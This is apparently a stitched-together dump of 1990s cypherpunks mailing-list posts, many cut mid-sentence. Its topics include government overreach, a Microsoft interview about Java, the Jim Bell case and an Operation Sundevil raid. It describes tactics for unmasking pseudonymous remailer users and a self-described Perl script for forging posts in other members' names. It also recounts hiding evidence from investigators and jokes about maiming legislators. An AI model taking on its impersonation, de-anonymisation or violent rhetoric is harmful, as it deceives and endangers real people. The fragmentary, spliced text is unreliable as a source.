and free those "honest" words that have been trapped down there ever

  God, I love an Constitution with "adaptable principles."
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  ^^^^^^^^^^^^^^^^^^^^^^^^^^
  Exactly. The right wing kills us with weapons and the left wing
kills us with kindness.
  The Constitution has always suffered as much or more under the
judicial influence of Democrats than it has under the influence of
Republicans. The citizen's pocketbook, likewise--the Republicans want to spend others' money on weapons and the Democrats want to give it to "worthy" causes of "their" choosing.
  If one of their relatives needs a kidney, then the Republicans
want to force drug-dealers and child-pornographers to give them
one of theirs. The Democrats want to hold a lottery so that all
of us are subject to giving them a kidney.
  Constitution!??!??
  How _dare_ you suggest tht drug-dealers have rights? How _dare_
you suggest that someone with no kidneys doesn't have a right to
receive your "spare" one from the government?
  Like it or not, when two cops blatantly lie on the witness stand (i.e. - telling you that the husband of a murdered woman was not considered a "suspect" when they climbed over his fence) then their
evidence should be thrown out. The majority of the nation (and an
elected judge) just coughed and looked at their feet when that happened at the "guilty black man's trial," but the "honest" jurists
who held a human life in their hands did not.
  Halfway through the O.J. trial, someone asked me what I thought
the verdict should be. I glanced at the courtroom circus and said,
"I think we should find them _all_ guilty!"
  I have come to the same conclusion regarding our legislators.
If I were on the Supreme Court, I might take into consideration my
need for fertilizer for my garden when deciding their fate. (Of course, being a strong Constitutionalist, I would only have their
"Bare Arms," which the Constitution gives me the right to, cut off
to feed my plants.)
  Timothy May points out that things have reached a point where we
no longer need to decide on the "kind" of solution to our problem,
but the "calibre" of the solution (or "megatonnage").
  Robert Hettinga made a good point that, while we may be having a
lot of fun with our discussions about the law and the Constitution,
technology and the economy will likely influence most of the future
direction of eCa$h (as well as privacy and freedom, etc.).
  Sadly, they are both more right than most of us would like to admit.
I would like to think that Republicans and Democrats, the EFF and Freeh, the Government and the people, Rodney King and the L.A. cops,
could "all just get along."
  The reason we can't? We have no longer have a Constitution to hold
on to--to balance the stronger against the weaker, the larger against
the smaller, the "little" rights and wrongs against the "big" rights
and wrongs.
  So we end up with legisltors who now have the power to give our
money to the rich _or_ to the poor depending on who holds power,
and they have the power to kill us with weapons _or_ with kindness when they hold the majority.
  We are governed by those who think that "The answer to blatantly
unconstitutional laws, is _more_ unconstitutional laws." and "The
Legislature interprets the Constitution as damage, and routes
around it."
"A Vote for TruthMonger is a Vote for Fear, Uncertainty and Doubt."
   Perhaps we need to start a FUD Party. Run a multi-user persona
candidate, such as TruthMonger. (MayMonger, TreiMonger, SchearMonger,
snowMonger, CrispinMonger). We can each gather our own brand of
faithful under a common flag, telling each faction whatever kind
of FUD they want to hear before they will vote for us, and become
the next majority.
  Once we are in power...we restore the Constitution, throw out all
other laws, and starch the flag (so that nobody can wrap themself
in it). Then we quit.
{Disclaimer: The fault in the idea espoused above lies in the fact
that I (and proably many others) cannot hold it in my mind for more

small "improvements" I could make before resigning.}

 These guys promised us some nice stuff for our homes and schools in the

 On the anonymous remailing of IP packets project the cypherpunks are workng
 together with the naval security of the USA. Why? These naval security
 people are working on the same thing, and they need other traffic using the
 same protocols to hide their own traffic in. Otherwise everyone can see
 they are transmitting from A to B. However, the cypherpunks had to explain
 the naval security first that if they want this technique more widespread,
 they have to make it available for cheaper machines and morre widely used
 operating systems... something they had not thought of themselves.
 You might think: "Is all this not illegal?" No it's not (yet, in most

I think SSH will not tunnel UDP, and TCP NFS for Linux and Solaris (?) is

also very neatly lets you run remote commands and so on.  (Enough,

@_subject: Microsoft and Java 
The Paul Maritz interview that article links to has disappeared from
Computerworld's site, but a copy is appended.
Formerly at      Microsoft Corp. last week indicated that it would essentially block
     efforts to make Java a cross-platform development language, stating
     that it wouldn't ship Sun Microsystems, Inc.'s Java Foundation Class
     Libraries (JFC). Computerworld senior editor Carol Sliwa caught up
     with Paul Maritz, Microsoft group vice president, at a company
     reception in Seattle and asked him to explain the software giant's
     Java stance.
     CW: There's nothing in the license that requires you to ship those
     JFCs with Internet Explorer?
     Maritz: Correct.
     CW: Is that a contentious issue?
     Maritz: No. The only reason I brought it up is just that some people
     like to play hard and fast with the truth, and they like to say,
     'Look, these JFC class libraries are going to be a standard because
     everybody has to ship them. Even Microsoft has to ship them.' And
     that's not the case. We were very careful when we did the deal to
     say that we could have the option of shipping them, but we do not
     have to include them in Windows.
     CW: Is there some reason you wouldn't want to ship them? Is there
     something inferior about them?
     Maritz: No. We don't want to put further bloat on top of the system.
     We think that basically there isn't a lot of end-user value in them.
     And Sun's trying to establish them as basically their platform. It's
     a competing operating system.
     CW: Do you feel your Application Foundation Class Libraries (AFC)
     are superior to their JFCs?
     Maritz: No. AFCs ... make it easier to write apps. But our real
     strategy is J/Direct. So our answer to JFC is not AFC. It's J/Direct.
     CW: It sounds like Microsoft is resentful at Sun for taking a
     dictatorial role.
     Maritz: The reason we brought it up is Sun likes to blur these two
     things together. They like to blur the notion of Java the language
     and Java the class libraries. They'd like to package them all into
     that concept. We're just saying, 'Hey, there is a difference between
     the two. Let's be clear on that.' "
     CW: Do you think you're going to end up fragmenting the language even
     more?
     Maritz: Not the language. You're making the mistake. You're falling
     into their mind-set -- [ignoring] the difference between Java the
     language from Java the class libraries.
     CW: But in the end result, a network manager will have to make sure
     he has both sets of class libraries.
     Maritz: Let me ask you this question: The fact that you can call
     Windows [application programming interfaces] from C++, did that
     splinter C++? It did not. It's the same issue.
     CW: But if Java's promise is that it'll be a cross-platform
     language --      Maritz: No. No. Sun's trying to make it that.
     CW: But say there's an electronic-commerce application that somebody
     wants to run cross-platform, and that's why they picked Java. And
     they use the JFCs to write it.
     Maritz: Good luck.
     CW: It's not going to run in Internet Explorer.
     Maritz: It may or may not. But the point is, that's Sun's problem.
     It's not our problem.
     CW: Does it end up being companies' problems, too? Are you saying
     they're foolish for buying into the theory that there can ever be
     cross-platform language?
     Maritz: No. We're saying it's no different from any other
     cross-platform [strategy]. This isn't the first one -- [there was]
     CBT, Appware, etc. We're just saying that, 'Hey, you should realize
     that when you're doing that, you're dependent upon Sun to get it to
     work.'
     CW: But if you bought into the JFCs, then you wouldn't be in this
     particular case. If you shipped JFCs, you'd help foster the idea of
     cross-platform.
     Maritz: And I don't want to ship another operating system on top of
     our operating system and burden every copy of Windows with all of
     that extra weight.
     CW: Do you agree that it makes developers have to make choices and
     it makes them have to do more work and it makes companies have to
     install both sets of classes? So in the end, it makes life difficult
     for everyone, doesn't it?
     Maritz: But we think that that's reality, because you either get this
     thing to become a heavyweight thing, in which case it's going to
     perform badly. Or you have to make it something very small. So we're
     not trying to be parties to perpetuating the myth.

@_subject: Cartel Leaders Set Snipers To Work In Border War 
A major thrust of the article deals with the government promotion
of the idea that the "bad guys" have actively declared war upon agents
of the U.S. government, on U.S. soil.
  Strange that this claim should come from a variety of sources at
the same time the government is facing the embarassment of having to
whitwash the actions of heavily armed, camouflaged Marines who felt
so threatened by a goat-herder with a .22 rifle that they slaughtered
him with their M-16's, despite the fact that the child was an American
citizen, doing what he had every right to do, on American soil.
  The drug cartels are having such little trouble getting drugs into
the U.S. that cocaine and heroine are cheaper than a bottle of good
Scotch, yet, according to the government, they have decided that it is necessary to perform actions which will "force" the government
to 'crack down' on border terrorism with increasing use of armed
force. Right...
  I bet the child pornography cartels are arming themselves, even as we speak, preparing to join the drug cartels in their war against
the U.S. governement. We'd better send some Marines to Denver, New
York City, and Fargo. Then everybody but the high-school goat herders
will feel much safer, I'm sure.

Right, small, warm-blooded creature.
  There are a plethora of available avenues for surruptitious agents to
exploit InterNet technology and methodology in order to reveal both your
identity and the content of your communications.
  To truly achieve anonymity and privacy, one should be prepared to use
the strictest standards of paranoia, the full capabilities of privacy
and anonymity tools, and personal methodologies aimed at thwarting
unlikely and/or impossible surveillance techniques as well as the
currently known methods.
  Beyond the mere technology itself, one must consider the possibile
use of psychological manipulation of individuals and groups into a
specific mindset that, combined with an analysis of the individual's
natural psychological profile, can enable a surreptitious entity to
move the individual toward patterns or processes which will make
the technological tools of identity and information analysis more
 For example, take the fictitious case wherein an individual is prone
to using only two different remailers, say, for instance, the remailer
at c2net and the remailer at dhp.com.
 Suppose that the remailer at c2net was being monitored surreptitiously
by an agent who had access to their system, but either had no way to access messages encrypted to the remailer, or their efforts to monitor the remailer seemed to be thwarted at times by another, unknown entity
with access to the system.
  The surreptitious agent could arrange to have the c2net remailer shut
down under some pretext, and seed the monitored individual's private
email, mailing lists, and newsgroups with subtle pointers/suggestions
as to the reliability/security, etc., of another remailer which was
more securely under the agent's control, say, for instance, a remailer
at replay.com.
  After the monitored individual has begun using the remailer at
replay.com, then the agent would proceed to do the same thing in regard
to the remailer at dhp.com, and another remailer controlled by the
agent or associates of the agent, say, for instance the remailer at
  The agent is now in a postion to have the majority of the monitored
individual's communications vulnerable to identity, information and
traffic analysis, and thus will have an enormous amount of information
to work with should the individual occasionally spread their anonymous
communications through remailers that the agent may have less complete
access to.
  If we suppose that the agent also is able to manipulate the monitored
individual into sending the agent email that is encrypted to several
recipients, including the agent or the agent's associates, then we see
that the agent now has an even broader database of known information
which can be analyzed to provide clues as to the identity of and the
information sent by others who communicate with the individual who is
being monitored.
  This fictitious example, if it came to pass, would serve to provide
information to the agent which could be used to more effeciently target those who would be subjected to more restricted forms of
surveillance, such as monitoring of the physical signals given off
by their computer, keyboard, and monitor.
  All in all, the small, warm-blooded creature is correct in implying
that one should always keep a shotgun by their computer, in the firm
knowledge that the dogs of war do not always bark to announce their

And even then one must never trust it completely.  An appropriate degree
of paranoia means that not only must one use all the appropriate tools and
techniques, but that one must be prepared for the possibility that the
tools may fail. Following is a fairly obvious scenario, but still perhaps interesting:
Imagine that an agent X wants to find out the real identity of
somebody posting under the pseudonym A.  X can retrieve the list
membership through the mailserver.
X composes a post to the list designed to elicit a response from A,
perhaps flaming A, or criticising something dear to A.  They prepare n
variations of the post by inserting different spacing, spelling, or
phrasing and keep track of each variation.  They post one variation to
each member, relayed through toad.com.
If X is lucky, A will reply to the post (not noticing the slightly
unusual header), quoting some of the original matter.  By looking at
the spelling etc in the quoted part X can determine which original
version A received and hence what address they use to read the list.
Now this is by no means certain to work: A might not reply, they might
not quote enough material to allow the original to be identified, or
they might notice that the mail is not really from the list.  Even if
X can associate the reply with an original, they have no really
conclusive evidence, but then...
It has, perhaps, only a ten percent chance of success, but this is
nevertheless significant.  If A is posting anonymously just for the
convenience of not having his/her email address dredged up by search
engines, or from broadly-based monitoring this is perhaps OK.  If A
writes against people or governments that might retaliate, then A
should at least consciously accept the risks.
Nicely put.
That's good to know.  Some of them need to be watched.

@_subject: The Real Bell Issue / Re: Bell, etc 
The following, from the Columbian, lies at the heart of the
real issue that Bell's persecution was all about.
  Every year, just before Income Taxes are due, the IRS picks out
a few people to unjustly persecute in order to strike fear into
the heart of the taxpaying sheeple.
  They always manage to completely fuck over a variety of citizens
in a manner that will generate maximum publicity at that time of
year. They always seem to include at least one fairly average
citizen who gets everything he owns seized, including bank accounts,
etc., over a tax dispute involving nickles and dimes. Those who
express outrage over these actions are the IRS's best friend.
  "They have no right to..."
  "They are out of control..."
  "They can do anything they want to you..."
  This is all music to the IRS's ears.
  Jim Bell was like manna from heaven for the IRS. It gave them an
opportunity to bring down the fascist forces of a wide variety of
government agencies to back the IRS's play in this instance.
  Bell's persecution was not a mistake, it was a loud and clear
message to the taxpaying sheeple that they are "a felon under an
increasing number of laws," and that the IRS has a plethora of
government agencies ready and willing to join them in fucking over anyone who gets out of line.
  And what is the IRS's definition of "getting out of line?":
  Apply for a tax refund and have every real or imagined sin you
have ever commited used against you.
  "A person who asked the IRS for a tax refund, had his home raided
today by 20 armed government terrorists from a wide variety of
government agencies.
  "This person who asked for a TAX REFUND has never been proven to
have anything to do with DRUGS such as METHAMPHETAMINE, and is not
known to be a SPEED FREAK or a DRUG DEALER. As well, government
agents investigating the person asking for the TAX REFUND have
never found any ILLEGAL DRUGS on his person or property, but the
person who asked for the TAX REFUND will be mentioned in connection
with DRUGS and METHAMPETAMINE, or SPEED, CRANK, etc., for the rest
of his life, every time he "comes to our attention" as a result
of asking for a TAX REFUND."
  I would not doubt that the IRS asked the local newspapers to put
a picture on their front page of 20 armed governement terrorists putting guns to the heads of Ma and Pa Bell, with Jim on the ground
with a boot at his throat, and a huge headline reading,
  "MAN ASKS FOR TAX REFUND!"
  The IRS spends the whole year going after people who they deem
to be guilty of tax evasion, and it is usually a fairly boring
affair involving accountants and lawyers.
  The weeks preceeding the date taxes are due to be filed are
reserved for high-profile cases which the sheeple can easily
recognize as persecution by a heartless agency with supreme power
at their disposal.
  The real issue in Bell's case is not just persecution, but easily
recognizable persecution. Otherwise, the whole Bell affair would be
  Perhaps, upon sentencing, we will see a headline,

The fact of the matter is, none of us know what Jim knows, and what
he knows is likely only what his government appointed schill has told
him. I recall Vin Suprynowicz mentioning a prominent attorney contacting
Bell's attorney in an effort to help, and receiving no reply.
  Neither do we know if Bell has merely decided that he should concede
the legal ground in order to be able to pursue the issue later, on
turf that suits him better.
  We have already seen the results of Tim McVeigh wanting his government
schill replaced--a big FUCK YOU.
  McVeigh's problem is not weakness, but lack of knowledge about the
legal system and the quality of his legal representation. Unfortunately,
I have no doubt that the government already has lawyers in place whose
job thus far has been to gain McVeigh's trust, so that they can screw
up his appeals, as well.

In 1938, five years after taking power, the Nazis enhanced the 1928 law. The Nazi Weapons Law introduced handgun control. Firearms ownership was restricted to Nazi party members and other "reliable" people.

Contrary to the Marxists, the Nazis did not advocate public owner-
ship of the means of production. They did demand that the government oversee and run the nation's economy. The issue of legal ownership, they explained, is secondary; what counts is the issue of control. Private citizens, therefore, may continue to hold titles to property, so long as the state reserves to itself the unqualified right to REGULATE the use of their property...

prosecuting criminals, it was about scaring the shit out of 15 year olds.
First, many of the people raided under operation sundevil already KNEW that
they were going to be raided, or at least suspected. I myself was informed,
by some friends, some time before the raid that there was a DNR on my phone
line. I also recieved an anonymous phone call "warning" me to stay away
from "hackers". Second, the secret service agents actualy preforming the raid seemed to
view it as an elaborate joke after the figured out that the threat to
national security or whatever was 14 years old, in fact, the only agent
there that seemed to take it seriously was a postal inspector who solemly
informed me " your going to jail for a long time buddy" as the secret
service agents chatted about vaious trips to russia guarding reagan and
complimented me on how smart i must be. Third, their cell phones didnt work, and after calling the office to get
them to DTMF decode numbers in my speed dial, they never erased the redial
on my phone, leaving their office number there for me to DTMF decode myself. They seemed to ignore things that actualy WERE evidence and took things
like calulators and batteries ( they were really excited by the fact that
i had loads of batteries because early blue boxes used loads of power and
you needed to change batteries frequently). My lawyer couldnt get ANY information about the investigation and i never
recieved any calls and was never even questioned, dont you think that if
they were interested in breaking a worldwide conspiricy of hackers they
would have at least asked me a few questions? (besides what i used all the
batteries for). In any case, there is a HUGE difference between raiding the houses of some
14-15 year old computer geeks who actualy think they will be shot when they
are woken up by a secret service agent with a shotgun in their face and
still believe that an arrest for " computer crimes" will ruin their life
and at best has their very very irate parents to arrange for their defence
and raiding the house of an adult who knows what the effects of their
actions will be, which in computer crimes is just alot of attention, little
jail time, and a fat job when you get out. I almost wish i had gone to
trial, I would never have had to go to college to get a CS degree. BTW. about 3 years ago I recieved a call from the NYC secret service field
office , I thought at first they had finaly decided to arrest me. But what
in fact happened is that they decided to return all the computer equipment
siezed in the raid. They returned 2 huge boxes of now obsolete computers
and peripherals , complete with SS evidence tags saying " Location :
Bedroom , Sex: Male" , and SS disks in the 5 1/4 floppy drives  to potect the heads". Its a good thing they never realized that I gave my
then brand new 20 mb external hard drive to a friend with all the real
evidence on it untill after the raid. They also informed me that the
investigation was still underway and I should wait for further contact.

I am one of the "chosen." As a matter of fact, I am not only the Grand PoohBaah of the TruthMonger CypherPunk Cult, I am its
"sole" member.
  Black Unicorn is the "soul" member of the Black Unicorn CypherPunk
Cult, and its Grand Pooh-Baaa...Baaaa...Baaaa.
  Blanc Weber is the Grand PoohBroad of the Blanc Weber CypherPunk
Cult, even though her cult does not have a "member."
  I realize that it is difficult for someone who defines themself
by their position in the "group" or their membership in the "herd"
to truly conceive of perceiving life from the perspective of an
individual entity with social capabilities.
  If the cypherpunks mailing list is attacked in my presence, I may
well choose to join in circling the wagons, even if I am capable of
outrunning the attack, or I may choose to shout, "It's OK, I'm going
for help." as I ride off over the horizon to the nearest bar. And
later I may make the same or a different choice if the fight-
censorship list is attacked in my presence.
  The key word is "choice." As in "free."
  "Free...Choice"
  Am I missing something here? Does my brain make a connection between
these two words because of an electrical malfunction, or am I correct
in my assumption that these two concepts are closely related?
  "Voluntary...Mandatory"
  Buuzzzzzz!!!!!!!!!!!!!
  Oops! This combination causes a genuine short circuit, setting off all
kinds of bells, buzzers and flashing lights.
  (BAD COP! NO DONUT!!)
  To tell the truth, I "chose" myself as sole member and Grand PoohBah of the TruthMonger CypherPunk Cult because I *do* feel that I am "irrevocably different" from "those other unfortunate
creatures" that share a physical form similar to mine.
  Of course all of those other people are fucking idiots! That's
why I chose *me* to live my life, and not them. And I'm sure that
most of them feel the same. Have you ever sat down at watched the
world go by, viewing every passing person from the perspective of,
"What if I, in this body, were like them? Thought like them, liked
what they liked, hated what they hated, acted as they act."
  I've done that when I was on top of the world, and I've done that when I was in the gutter, and the answer was always the same.
  "Fuck those idiots! I'm *me*, not them!"
  Nothing personal, Kent, but if I had chosen you to live my life,
I think it would have been a bad mistake. And vice-versa, I am sure.
  Tim speaks of those who feel it is their duty/right to "collect
tribute from those who don't want to make the contribution freely."
  Do you feel he is "obligated" to pay tribute to the people who
show up on his doorstep wanting money to buy child sex-slaves? How
about Bibles? Fatty hamburgers? Lean Cuisine? Taxes?
  Somewhere in the world there is a child dying of hunger who could
be fed for a time if you sold your computer and bought food for the
child. But the child is *not* dying *because* you didn't sell your
computer and buy him/her food.
  The child is dying for the same reason that you and I are also
dying--because it was born. ("No One Gets Out Of Here Alive")
  Bill Gates is a Cult of One, and a starving child is a Cult of
One. Bill Gates is feeding a lot of people. Is he feeding *enough*
people? Ask him, I'm sure he'll tell you how *he* feels about it.
  Perhaps Bill Gates is "bleeding" a few people to survive in the
business jungle. Is he bleeding *too*many* people? Ask him, I'm
sure he'll tell you how he feels about it.
  Mother Teresa is a Cult of One. That is how many people she
eats for, in order to stay alive. Is she murdering a starving
child with every bite she takes? Do you also need a powerful microscope to find *her* heart?
  Years ago, the Reader's Digest had an ancedote about a small
rural town with only one house. When entering the "town" from
either side, there was a welcoming sign just like one sees in
many cities and towns across the nation.
  The sign read something like this:
             "Welcome to Smithville."
                 "Population 1"
              "Mayor -- Dave Smith."
           "Fire Marshall -- Dave Smith"
           "Town Treasurer -- Dave Smith"
  "Drive Carefully. The life you save could be Dave's."
  So it was not surprising to find out that Dave Smith is a CypherPunk.
(David E. Smith )
  Have you never noticed that it is called the cypherpunks mailing list?
                                                         ^
  Plural, Kent, plural. The name is plural in order to warn newcomers
to the list that we are not all "one" and that, despite the wishes of
Rodney King, we may not all "get along."   The word "we" is for use by Kings, Priests, and people with tapeworms.
I'm not adverse to striking a deal where you watch my back and I watch
yours, but if you are incapable of watching your own front, then it's
really not my problem.
  If Tim is low on ammo, he would probably find it in his best interest
to cover you while you make a break for yours. If he has plenty of ammo
he might *choose* to do the same, for his own reasons.
  I, for one, however, would not want to show up on his doorstep and
tell him he was *obligated* to cover me while I attempted to get back
the ammo I had given away when the government "required" it of me.
  It's not because I think he's heartless. It's because I *don't*
think he's *brainless*.

   :  be repeated.  Try unplugging the microwave and then doing a cold
   :  reboot. If this doesn't work, contact your hardware vendor.
   :
   :  Many users have reported that the dinner tray is far too big,      :  than the dinner itself, having many useless compartments, most of
   :  which are empty.  These are for future menu items.  If the tray is
   :  too large to fit in your oven you will need to upgrade your
   :  equipment.
   :
   :  Dinners are only available from registered outlets, and only the
   :  chicken variety is currently produced. If you want another
   :  call MicrosoftHelp and they will explain that you really don't
   :  another variety. Microsoft Chicken is all you really need.
   :
   :  Microsoft has disclosed plans to discontinue all smaller
versions      :  their chicken dinners.  Future releases will only be in the larger
   :  family size.  Excess chicken may be stored for future use, but
   :  be saved only in Microsoft approved packaging.

   :  Microsoft promises a dessert with every dinner after '98. However,

It certainly sounds like blackmail to me.
Surely people on this list are aware of how fallible governments are? Those punishments are a bit too final to be within the power of a legal
system so prone to mistakes and corruption. Although current western legal systems constrain citizens, they also
constrain the government, which is probably a good thing.  The media is
very weak on reporting abuses of power by police and the military, but at
least they're not always completely covered up.  Yes, both individuals and governments can break the law, but it stops them
Other common oversimplifications include:
 The United States has a large gap between rich and poor and a lot  of crime.
 The United States has a lot of lawyers and a lot of crime.
 The United States has a lot of guns and a lot of crime.

THE LIBERTARIAN, By Vin Suprynowicz
    'Enough money to have fed every human on earth'
    "August 2, 1997, marks the 60-year anniversary of the failed and
devastating American public policy of drug prohibition," announced
California Libertarian  gubernatorial candidate Steve Kubby of Lake
in a recent -- and refreshingly outspoken -- press release.
  "Just how big is $400 billion?" Kubby asks. "Adjusted for 1997
$400 billion is enough money to have fed every human on Earth, each
for the past 10 years."
  "As one of the chief architects of the War on Drugs, Lungren has a lot
explaining to do," Kubby said. "What has been accomplished by spending
such an incredible sum of money? We've created the biggest prison system
the history of the world, with more of our own citizens rotting behind
than any other nation in the world -- and drugs are cheaper and more
available than ever before, especially to kids.
  "It's time to hold public officials like Dan Lungren accountable for
tragic waste of money and lives that has produced nothing but more
more violence, more addiction, and more misery."
"It is even more puzzling as to why Mr. Lungren thinks his colossal
failures in the War on Drugs qualify him for higher public office."

Don't see how you can argue against that one.
So?  Actually, we have a lot of handguns, in the hands of criminals,

the ATF, FBI, and the National Park Service.
If we have guns in the hands of responsible people, we have a good

We don't need disarmamant.  We need armed responsible citizens forming

  Since the death of Dale Thorn, I have lurked silently in the list
background while observing the creeping conspiracies continually
compromising cypherpunk costs.
  I mean..."posts." {Damn, now I'm doing it, too.}
  Doing what, you ask?   How did you know what I said? Are you with the MIND POLICE?   AM I SURROUNDED??!!!??
  {Oh...I see that I put that thought in brackets, where you could
   read it. Whew! Had me worried for a minute, there.}
  To continue...
  Being an anonymous coward who hides behind remailers the few times
that I post, I have been somewhat hesitant, nonetheless, to reveal
the observations and accompanying thoughts about the direction that
the cypherpunks lissed has taken {Damn, that's twice, already. I may
be infected, like many of the others} since the end of the Nazi moderation/censorship experiment.
  While other, more vocal, list members were celebrating the apparent
'victory' over the johnboot of fascism being lifted from our typing
fingers, I had a troubled mind, worrying whether the evil forces
were truly vanquished or whether they had merely escaped by way of
the anonymous remailers, to the negative pole, where they would
bide their time and prepare to strike again.
  I was counting on the shit-disturbers, chiefly Dale Thorn, to
keep a practiced eye out for signs of the evil farces {Was that a
typo, a Freudian slip, or another sign of the mind infection that
is rapidly spreading on the list?} regrouping to once again try
to destroy the cypherpunks list.
  Suddenly, Dale disappeared--faster than you can say, "Jimmy Hoffa."
For a time, Toto attempted to carry on in his stead, but I *knew*
Dale Thorn, and Toto is no John F. Kennedy.
  {Shit! Now I'm beginning to steal and corrupt the words of others.
   I'm not certain I like the implications of this. The plot may go
   even deeper than I previously thought...}
  Where was I...?
  Oh, yes...the Plot of the Platypus...

...                                        *^^^^^^^*
  Notice anything a little bit *strange* in the above quotes?
  Suddenly, "? the Platypus" is the the only one of this group that
can spell welfair...warfair......welfare.
  {Damn! What's that clinging to my back?}
  What is going on here? As the Platypus's spelling gets better, the
other list members' spelling gets worse.
  For example:
Ray Arachelian sayhed:
         *^*
     *^^*
Tim May wroted:
      *^*
  The Cypherpunk Philosophist King, lame-ing while flame-ing? Worse yet, while flame-ing about lame-ing?
  Lame-ing while flame-ing about lame-ing? Fucking up his spelling while taking a cheap-shot at someone's disability in their ability to
'dis' someone with proper spelling?
  And then, after his "capitcal" misfire, the object of his scorn returns fire with a correct spelling of "redistribution?"
? the Playtpus correctly scripted:
  Am I making too much of this? A few simple typo's, you say? Perhaps
an occasional slip of the finger--a momentary lapse of mind and/or
memory, leading to a misspelled word?
  {Or is it 'mispelled'? I don't know, and I'm afraid to look it up.
   I could use the spell checker, but... No! It's too dangerous.}
  It's the Plot of the Platypus, I tell you...I AM NOT CRAZY!!!!
  I did extensive analysis of the list posts in the last few months,
and I can state with absolute certainty that for every slight
improvement in the quality of the Platypus's spelling, there is a court responding decease in the Kuala-T of many of T ohter libsp
mambors spealing.
  {See? Do you SEE!?!? IT'S EVEN HAPPENING TO *ME* NOW.}
  That's not all. Just like before, others on the list are acting as
the shills for the chief instant gator of this spelling tragivesty.
Bill Stewart, a consciencious speller, said:
  See? Do you SEE?!?
  The subtle slams by the co-conspirators are beginning. It's the
next stage...
  "Having a little trouble with your spelling there, pal? There's no
more censorship, so you can say anything you want...as long as you
can SPELL it! Haaa...haaaa...haaa."
  The ebil fartses are once again attempting to split the cybferpukes
lissed in2 too kamps--the good spellers and the bag speelers.
  Think about it. Have you ever heard of "agraphia" before? Ever known
anyone that had it? Of course not! It was developed in an underground
lavoratory in Area 51 by reptilian Nazis.
  Well, maybe not "reptilian", but Nazis, just the same.
  And LOOK! I'm using double-quotes! *Misplaced* double-quotes,   THE MARKS OF THE *TOTO*!!!
  The conspiracy is spreading fast. It's everywhere. Kent Crispin,
government schill {Damn! I even spell 'shill' like Toto, now. At
least I managed to use single quotes this time, like we did in
the old days, before the censorship crisis...which just 'happened'
to happen shortly after Toto happeared out of nowhere...}
  Where was I...? Oh, yes...
  Crispin, who has long previously been the target of many vicious attacks by both Toto and the Platypus, is now showing signs of
the government generated Platyagraphia and the double-quote marks of the Toto.
Kent Crispin  say-heyed:
                ^    ^^^      ^
  Or is Kent Crispin, gubormint chill, marking funds of the wrist
of U.S.? Is he laughtering at uds B-hynd R backs?
  Is he a bubble agent in the Plop of the Paperplutz?
  Still skeptical? Wait!! There's more!!!
  {No, not the Ginsu knives, you fools. I'm talking about the Plop
   of the Pretty Puss.}
  Think about the following pots, which wah *snot* sent to the list
in order to hide the troops from the simplefucks lips dismemberers.
  Since it was not cent 2 the lips, I had to make it up, and now
I'm a forager, like Tutu making those bag fridgeries of ohter
cheaples pastes when he abuses their names without having their
parsimmons to accuse their name for making his own pissed to the

Peter Trei:
  "Hi. I used to be a boring guy. I was so boring that none of the assholes on the list even bothered insulting me, or forging posts in
my name.
  "Then one day, my life suddenly changed. Someone forged a post to the list in my name, and it was exciting. It was like getting robbed
at gunpoint. What a rush!
  "When I woke up the next morning, I couldn't face going back to my
normal, moral, ethical, boring life. I sent an anonymous post to the
list--as TruthMonger! It felt good, like being elected to a government
office by lying to people, but I wanted MORE. I began forging posts to
the list using other people's identities. If they complained to the
list, then I killed them, and assumed their list identities. It felt
like driving INSLAW into bankruptsy, stealing their software, and
murdering those who knew too much!
  "Now I am Peter Trei, boring cryptographer, by day, but I am any
exciting, unethical asshole I want to be, at night.
  "I liked the SECRET CONSPIRACY AGAINST THE CYPHERPUNKS LIST so
much that I *stole* the conspiracy. "? the Platypus" has nothing
to do with the Plot of the Platypus, I'm just making fun of his
disability, like a real asshole. Toto has nothing to do with it,
either. He's such a loser that everyone on the list can spot his
forgeries. (Well, they "used to could". But now that I can mimic
his style and have hacked his sympatico account, I can deny all
of this from my real list persona tomorrow, and nobody will be
the wiser.)
  "I'm not just a user of the cypherpunks list, I'm an abuser."
Kent Crispin:
  "This isn't Peter's conspiracy, its MINE! I mean, get real, I
work in a secret underground lavoratory as a government shill.
  "Think about it. Who would you expect to conspire against a
bunch of anarchists...the government! You all know how much I
love the government and authority. I'm Louis Freeh's secret
lover. Janet Reno is going to have my baby.
  "It's me! *I* am the one behind the SECRET CONSPIRACY AGAINST
THE CYPHERPUNKS LIST. I'm a STATIST, for God's sake, why won't
you believe me?   "Because I'm not one of the elitist 'chosen?' Fuck you."
Tim May:
  "God, I *love* this list."
Robert Hettinga:
  "Hey! If you check the archives, you'll find that I said that in a post, long before anyone else did."
  "Now Hettinga is stealing Tim May's lines. What the hell is going on, here? Has *everybody* on this list gone crazy?
  "*I* am the one who is *really* behind the SECRET CONSPIRACY AGAINST THE CYPHERPUNKS LIST. Think about it. Everyone knows
that I'm a 33rd degree Mason.  No...that's Tim May.

  "Shit! I'm not the list moderator, yet. That's *after* we
take over the list."

Do you all remember the Perl script I was working on for mimicking the
posts of other people? Well, this post is the latest product of that
script. What do you think? Is it convincing? Did you really believe
that it was actually written by one or more of the people mentioned
in the post?
I think that I finally have the Perl script to the point where I can
effectively fool most people about the true source and method of a
computer generated post's actual origins.
  I was thinking about adding a conspiratoral part about myself. I was
going to intimate that the fact that I was so active on the list during
the censorship crisis, playing the skeptic who was gradually brought
around to the truth of Dale Thorn and Toto's claims, then volunteering
to host the list and quietly disappearing into the background, might
indicate that *I* was really behind the SECRET CONSPIRACY AGAINST THE
CYPHERPUNKS LIST.
  In the end, I decided against it, because then the readers would be
left with the notion that perhaps even this explainatory note from me
was bogus, and that there really was an ongoing SECRET CONSPIRACY AGAINST THE CYPHERPUNKS LIST.

    FOR IMMEDIATE RELEASE DATED AUG. 31, 1997
    THE LIBERTARIAN, By Vin Suprynowicz
    'Necessary to the security of a free State'
 "I agree that things like the court system
can be
privately funded. ... However, my greatest concern is that a military
has to run a "pledge drive" in order to provision itself would not be
capable of posing a credible deterrent to any nations bent on
the US. If  you could address this point, I would appreciate it.
    #  #  #
  O.K. ...
  First, the notion that it's all right to steal at gunpoint "some
amount, as long it serves a legitimate public need" ignores the simple
moral truth that the end cannot be allowed to thus justify the means.
  When I loot your paycheck without your permission to do "good
works," I
can't possibly know whether that leaves you one dollar short of the
you needed to buy medicine for your dying mother, or one dollar short
the money you needed to complete an experiment that might result in
discovery of a cure for cancer.
  There is literally no way to measure the opportunities I thus steal
you, and how their potential results might weigh against what (start
ital)I(end ital) decide to do with your money. (Even assuming power
corrupt me until I can blithely assure you that "tobacco subsidies"
are "in

  The only thing that grants the United States government any
legitimacy --
